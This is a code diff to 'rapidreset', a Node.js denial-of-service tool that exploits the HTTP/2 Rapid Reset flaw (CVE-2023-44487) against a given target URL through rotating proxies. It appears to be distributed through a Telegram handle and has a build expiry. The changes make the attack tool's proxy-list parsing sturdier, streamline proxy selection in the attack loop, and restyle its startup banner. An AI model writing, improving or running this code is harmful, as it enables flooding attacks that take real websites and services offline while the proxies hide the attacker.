@@ -85,6 +85,10 @@ if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
       node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxyfile>
       node ${process.argv[1]} GET "https://target.com" 120 16 128 proxy.txt
 
+    Proxy file / --ip accepts:
+      host:port  ·  host:port:user:pass  ·  http://[user:pass@]host:port
+      blank lines, #comments and unsupported schemes are skipped
+
     Options:
       --query 1/2/3 - query string with rand ex 1 - ?cf__chl_tk 2 - ?fwfwfwfw 3 - ?q=fwfwwffw
       --delay <1-1000> - delay between requests 1-100 ms (optimal) default 1 ms
@@ -108,7 +112,59 @@ if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
 let hcookie = '';
 
 const url = new URL(target);
-const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')
+
+// host:port | host:port:user:pass | http://[user:pass@]host:port
+// Blank lines, #comments and unsupported schemes return null so they get skipped.
+function parseProxyLine(line) {
+    if (typeof line !== 'string') return null;
+
+    let entry = line.trim();
+    if (!entry || entry.startsWith('#')) return null;
+
+    let username, password;
+
+    const scheme = /^([a-z0-9]+):\/\//i.exec(entry);
+    if (scheme) {
+        if (scheme[1].toLowerCase() !== 'http') return null;
+        entry = entry.slice(scheme[0].length).split('/')[0];
+    }
+
+    const at = entry.lastIndexOf('@');
+    if (at !== -1) {
+        const auth = entry.slice(0, at);
+        entry = entry.slice(at + 1);
+        const sep = auth.indexOf(':');
+        if (sep === -1) return null;
+        username = auth.slice(0, sep);
+        password = auth.slice(sep + 1);
+    }
+
+    const parts = entry.split(':');
+    const host = parts[0];
+    const port = /^\d{1,5}$/.test(parts[1] || '') ? Number(parts[1]) : NaN;
+
+    if (!host || !Number.isInteger(port) || port < 1 || port > 65535) return null;
+
+    if (username === undefined && parts.length >= 4) {
+        username = parts[2];
+        password = parts[3];
+    }
+
+    return { host, port, username, password };
+}
+
+const proxy = fs.readFileSync(proxyfile, 'utf8').split(/\r?\n/).map(parseProxyLine).filter(Boolean);
+const customProxy = customIP ? parseProxyLine(customIP) : null;
+
+if (customIP && !customProxy) {
+    console.error(`[#8] Invalid --ip value: ${customIP}`);
+    process.exit(1);
+}
+
+if (!customIP && proxy.length === 0) {
+    console.error(`[#9] No usable proxies found in ${proxyfile}`);
+    process.exit(1);
+}
 
 if (new Date() > EXPIRY_DATE) {
     console.error('[#1] This build is outdated; contact @fasthttps');
@@ -438,18 +494,12 @@ function buildRequest() {
 const http1Payload = Buffer.concat(new Array(1).fill(buildRequest()))
 
 async function go() {
-    let proxyHost, proxyPort, username, password;
+    const entry = customProxy || proxy[~~(Math.random() * proxy.length)];
 
-    if (customIP) {
-        [proxyHost, proxyPort] = customIP.split(':');
-    } else {
-        [proxyHost, proxyPort, username, password] = proxy[~~(Math.random() * proxy.length)].split(':');
-    } let tlsSocket;
+    if (!entry) return;
 
-    if (!proxyPort || isNaN(proxyPort)) {
-        await go();
-        return;
-    }
+    const { host: proxyHost, port: proxyPort, username, password } = entry;
+    let tlsSocket;
 
     const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
         netSocket.once('data', async () => {
@@ -787,21 +837,86 @@ async function go() {
     });
 }
 
+// ── startup banner ───────────────────────────────────────────────────────────
+// The wordmark carries the only gradient in the tool: it marks identity, so the
+// data rows stay quiet and scannable. Labels keep a fixed 11-column gutter so
+// every value starts on the same column, and the old rule line is replaced by
+// whitespace so the block breathes instead of being fenced in.
+const colorEnabled = Boolean(process.stdout.isTTY) && !process.env.NO_COLOR;
+
+// COLORFGBG is "fg;bg"; a light background needs the deeper pair so the gradient
+// still clears WCAG AA instead of washing out. Unset means we assume a dark one.
+function detectedLightBackground() {
+    const bg = Number((process.env.COLORFGBG || '').split(';').pop());
+    return Number.isInteger(bg) && bg >= 7;
+}
+
+const lightBg = detectedLightBackground();
+
+const bannerPalette = lightBg
+    ? { from: '#0f766e', to: '#6d28d9', muted: '#475569' }
+    : { from: '#5eead4', to: '#a78bfa', muted: '#94a3b8' };
+
+const ANSI_RESET = colorEnabled ? '\x1b[0m' : '';
+
+function hexToRgb(hex) {
+    const value = parseInt(hex.slice(1), 16);
+    return [value >> 16 & 0xff, value >> 8 & 0xff, value & 0xff];
+}
+
+function lerpColor(from, to, t) {
+    return from.map((channel, i) => Math.round(channel + (to[i] - channel) * t));
+}
+
+// Labels use an explicit grey rather than the terminal's dim attribute, so the
+// contrast ratio is a known number (8.2:1 on dark, 7.6:1 on light) instead of
+// whatever the user's theme happens to make of "dim".
+function muted(text) {
+    if (!colorEnabled) return text;
+    const [r, g, b] = hexToRgb(bannerPalette.muted);
+    return `\x1b[38;2;${r};${g};${b}m${text}${ANSI_RESET}`;
+}
+
+function gradient(text, fromHex, toHex) {
+    if (!colorEnabled) return text;
+
+    const chars = [...text];
+    const from = hexToRgb(fromHex);
+    const to = hexToRgb(toHex);
+    const width = chars.filter((char) => char !== ' ').length;
+    let step = 0;
+
+    return chars.map((char) => {
+        if (char === ' ') return char;
+        const [r, g, b] = lerpColor(from, to, width > 1 ? step++ / (width - 1) : 0);
+        return `\x1b[38;2;${r};${g};${b}m${char}`;
+    }).join('') + ANSI_RESET;
+}
+
+function bannerRow(name, value) {
+    return `  ${muted(name.padEnd(11))}${value}`;
+}
+
 function runMaster() {
     const workers = {};
 
     Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }))
-    console.log(`
-  rapidreset ${VERSION} · CVE-2023-44487 · build ${BUILD}
-  Telegram: @fasthttps
-  ──────────────────────────────────────────
-  method     ${reqmethod}
-  target     ${target}
-  time       ${time}s
-  threads    ${threads}
-  ratelimit  ${ratelimit}/s
-  started    ${new Date().toLocaleString('en-GB')}
-`)
+
+    const meta = `· CVE-2023-44487 · build ${BUILD}`;
+
+    console.log([
+        '',
+        `  ${gradient(`rapidreset ${VERSION}`, bannerPalette.from, bannerPalette.to)}  ${muted(meta)}`,
+        `  ${muted('@fasthttps')}`,
+        '',
+        bannerRow('method', reqmethod),
+        bannerRow('target', target),
+        bannerRow('time', `${time}s`),
+        bannerRow('threads', threads),
+        bannerRow('ratelimit', `${ratelimit}/s`),
+        bannerRow('started', new Date().toLocaleString('en-GB')),
+        ''
+    ].join('\n'));
 
     function shutdownCluster() {
         const workerIds = Object.keys(cluster.workers);
